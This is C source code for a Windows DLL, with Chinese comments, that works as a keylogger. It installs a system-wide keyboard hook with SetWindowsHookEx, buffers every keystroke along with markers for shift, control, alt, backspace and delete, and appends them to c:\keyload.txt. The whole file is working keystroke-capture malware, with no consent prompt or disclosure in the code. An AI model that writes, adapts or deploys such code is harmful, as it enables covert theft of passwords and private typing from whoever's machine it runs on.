#include "keyhook.h"
#include <stdio.h>
#include <process.h>

#define CHARNUM 20
#define TXTLEN 10
#define SAVEFILE "c:\\keyload.txt"

static BOOL bHooked = FALSE;
static BOOL isUpper = FALSE;
static BOOL IE_is_active = FALSE;
static HHOOK hhook = 0, hhookMsg = 0;
static HINSTANCE hInst;
static int count;
static char tomb[CHARNUM];
static FILE *stream;
static int shift = 32;
short flag;

enum NUM{
    SHIFT,
    CONTROL,
    ALT,
    CAPITAL
};
static int condition[CHARNUM][CAPITAL+1];
static char text[TXTLEN];

void showMsg(int );
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){
    switch(fdwReason){
        case DLL_PROCESS_ATTACH:
            hInst = hinstDLL;
            printf("capital is %d ", CAPITAL);
            count = 0;
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        default:
            break;
    }

    return TRUE;
}


//安装钩子
DLL_EXPORT void SetKbHook(void){
    if(!bHooked){
        hhook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)KeyboardProc, hInst, (DWORD)NULL);
        bHooked = TRUE;
    }
}

//卸载钩子
DLL_EXPORT void RemoveKbHook(void){
    if(bHooked)
        UnhookWindowsHookEx(hhook);
}

//定义钩子
LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam){
    int i;
    if(wParam!=VK_TAB && wParam!=VK_ESCAPE && wParam!=VK_LEFT && wParam!=VK_RIGHT && wParam!=VK_UP && wParam!=VK_DOWN && 
            wParam!=VK_END && wParam!=VK_HOME && wParam!=VK_PRIOR && wParam!=VK_NEXT && wParam!=VK_INSERT && wParam!=VK_NUMLOCK && 
            wParam!=VK_SCROLL && wParam!=VK_PAUSE && wParam!=VK_LWIN && wParam!=VK_RWIN && wParam!=VK_F1 && wParam!=VK_F2 && 
            wParam!=VK_F3 && wParam!=VK_F4 && wParam!=VK_F5 && wParam!=VK_F6 && wParam!=VK_F7 && wParam!=VK_F8 && wParam!=VK_F9 &&
            wParam!=VK_F10 && wParam!=VK_F11 && wParam!=VK_F12){

        if((0x80000000 & lParam) == 0){ //keydown
            if(wParam == VK_CAPITAL)
                isUpper = !isUpper;

            if(wParam >= 0x41 && wParam <= 0x5a && !isUpper) //letter
                wParam = wParam + 32;

            if(wParam == VK_BACK && count > 0){
                count--;
                return CallNextHookEx(hhook, code, wParam, lParam);
            }

            tomb[count] = wParam;
            count++;
        }

        if(count==CHARNUM){
            stream = fopen(SAVEFILE, "a+");

            for(i=0; i<count; i++){
                switch(tomb[i]){
                    case VK_DELETE:
                        fprintf(stream, "%s", "<del>");
                        break;
                    case VK_RETURN:
                        fprintf(stream, "%s", "\r\n");
                        break;
                    case VK_SHIFT:
                        fprintf(stream, "%s", "<sft>");
                        break;
                    case VK_BACK:
                        fprintf(stream, "%s", "<bak>");
                        break;
                    case VK_CONTROL:
                        fprintf(stream, "%s", "<ctl>");
                        break;
                    case VK_MENU:
                        fprintf(stream, "%s", "<alt>");
                        break;
                    case VK_CAPITAL:
                        fprintf(stream, "%s", "<cap>");
                        break;
                    default:
                        fprintf(stream, "%c", tomb[i]);
                        break;
                }
            }

            fclose(stream);
            count = 0;
        }
    }
    return CallNextHookEx(hhook, code, wParam, lParam);
}

void showMsg(int digit){
    char text[3];
    if(digit >= 0x20 && digit <= 0x7e){
        if(digit >= 0x41 && digit <= 0x5a){ //letter
            if(isUpper)
                text[0] = digit;
            else
                text[0] = digit + 32;
        }
        else
            text[0] = digit;

        text[1] = '\0';
        MessageBox(GetDesktopWindow(), text, "hello", MB_OK);
    }else{
        itoa(digit, text, 10);
        MessageBox(GetDesktopWindow(), text, "hello", MB_OK);
    }
}

void Initcondition(void){
    int i, j;

    for(i=0; i<CHARNUM; i++)
        for(j=0; j<CAPITAL; j++)
            condition[i][j] = 0;
}
